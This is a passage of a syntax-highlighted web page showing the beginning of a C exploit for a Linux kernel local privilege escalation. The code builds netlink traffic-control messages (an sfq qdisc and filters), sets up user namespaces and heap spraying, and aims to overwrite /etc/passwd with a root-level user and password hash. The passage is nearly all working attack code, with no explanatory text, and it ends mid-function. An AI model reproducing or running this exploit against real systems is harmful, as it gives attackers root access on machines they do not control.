class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;endian.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if_arp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tc_ematch/tc_em_meta.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/capability.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/futex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/genetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_addr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_link.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_tun.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in6.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kcmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/neighbour.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_cls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/veth.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *target = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *overwrite =</span><br><span class="line">    <span class="string">&quot;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:root:/root:/bin/bash\n&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *global;</span><br><span class="line"><span class="keyword">char</span> *self_path;</span><br><span class="line"><span class="keyword">char</span> *content;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FILE_NUM 0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fds[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> fd_2[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> overlap_a = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> overlap_b = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cpu_cores = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> sockfd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> spray_num_1 = <span class="number">2000</span>;</span><br><span class="line"><span class="keyword">int</span> spray_num_2 = <span class="number">4000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// int spray_num_1 = 4000;</span></span><br><span class="line"><span class="comment">// int spray_num_2 = 5000;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_main[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_parent[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_child[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_defrag[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_file_spray[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> run_write = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> run_spray = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *passwd;</span><br><span class="line"><span class="keyword">bool</span> overlapped = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DumpHex</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="keyword">char</span> ascii[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">size_t</span> i, j;</span><br><span class="line">    ascii[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i]);</span><br><span class="line">        <span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &gt;= <span class="string">&#x27; &#x27;</span> &amp;&amp;</span><br><span class="line">            ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &lt;= <span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span> || i + <span class="number">1</span> == size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i + <span class="number">1</span> == size)</span><br><span class="line">            &#123;</span><br><span class="line">                ascii[(i + <span class="number">1</span>) % <span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> &lt;= <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (j = (i + <span class="number">1</span>) % <span class="number">16</span>; j &lt; <span class="number">16</span>; ++j)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pin_on_cpu</span><span class="params">(<span class="keyword">int</span> cpu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(cpu, &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;sched_setaffinity()&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">write_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">const</span> <span class="keyword">char</span> *what, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, what);</span><br><span class="line">    vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (write(fd, buf, len) != len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> err = errno;</span><br><span class="line">        close(fd);</span><br><span class="line">        errno = err;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">use_temporary_dir</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;touch exp_dir/data2&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *tmpdir = <span class="string">&quot;exp_dir&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!tmpdir)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chmod(tmpdir, <span class="number">0777</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chdir(tmpdir))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    symlink(<span class="string">&quot;./data&quot;</span>, <span class="string">&quot;./uaf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setup_common</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="number">0</span>, <span class="string">&quot;/sys/fs/fuse/connections&quot;</span>, <span class="string">&quot;fusectl&quot;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">adjust_rlimit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = (<span class="number">200</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line">    setrlimit(RLIMIT_AS, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">32</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_MEMLOCK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">136</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    <span class="comment">// setrlimit(RLIMIT_FSIZE, &amp;rlim);</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_STACK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">0</span>;</span><br><span class="line">    setrlimit(RLIMIT_CORE, &amp;rlim);</span><br><span class="line">    <span class="comment">// RLIMIT_FILE</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">14096</span>;</span><br><span class="line">    <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        rlim.rlim_cur = rlim.rlim_max = <span class="number">4096</span>;</span><br><span class="line">        spray_num_1 = <span class="number">1200</span>;</span><br><span class="line">        spray_num_2 = <span class="number">2800</span>;</span><br><span class="line">        <span class="keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rlim) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;setrlimit&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_namespace</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> real_uid = getuid();</span><br><span class="line">    <span class="keyword">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_uid))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\n&quot;</span>, real_gid))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NLMSG_TAIL(nmsg) \</span></span><br><span class="line"><span class="meta">    ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)-&gt;nlmsg_len)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr</span><span class="params">(<span class="keyword">char</span> *attr, <span class="keyword">int</span> type, <span class="keyword">void</span> *data, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">rta</span> =</span> (struct rtattr *)attr;</span><br><span class="line"></span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = RTA_LENGTH(len);</span><br><span class="line">    <span class="keyword">if</span> (len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(attr), data, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> RTA_LENGTH(len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_l</span><span class="params">(struct nlmsghdr *n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type, <span class="keyword">const</span> <span class="keyword">void</span> *data,</span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="keyword">int</span> alen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = RTA_LENGTH(alen);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">rta</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len) &gt; maxlen)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;addattr_l ERROR: message exceeded bound of %d\n&quot;</span>, maxlen);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rta = NLMSG_TAIL(n);</span><br><span class="line">    rta-&gt;rta_type = type;</span><br><span class="line">    rta-&gt;rta_len = len;</span><br><span class="line">    <span class="keyword">if</span> (alen)</span><br><span class="line">        <span class="built_in">memcpy</span>(RTA_DATA(rta), data, alen);</span><br><span class="line">    n-&gt;nlmsg_len = NLMSG_ALIGN(n-&gt;nlmsg_len) + RTA_ALIGN(len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct rtattr *<span class="title">addattr_nest</span><span class="params">(struct nlmsghdr *n, <span class="keyword">int</span> maxlen, <span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">nest</span> =</span> NLMSG_TAIL(n);</span><br><span class="line"></span><br><span class="line">    addattr_l(n, maxlen, type, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> nest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addattr_nest_end</span><span class="params">(struct nlmsghdr *n, struct rtattr *nest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    nest-&gt;rta_len = (<span class="keyword">void</span> *)NLMSG_TAIL(n) - (<span class="keyword">void</span> *)nest;</span><br><span class="line">    <span class="keyword">return</span> n-&gt;nlmsg_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_qdisc</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new qdisc</span></span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWQDISC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line">    <span class="comment">// set local</span></span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_parent = TC_H_ROOT;</span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;sfq&quot;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    DumpHex(msg, msg-&gt;nlmsg_len);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">u_int32_t</span> from, <span class="keyword">u_int32_t</span> to, <span class="keyword">u_int32_t</span> handle,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">u_int16_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    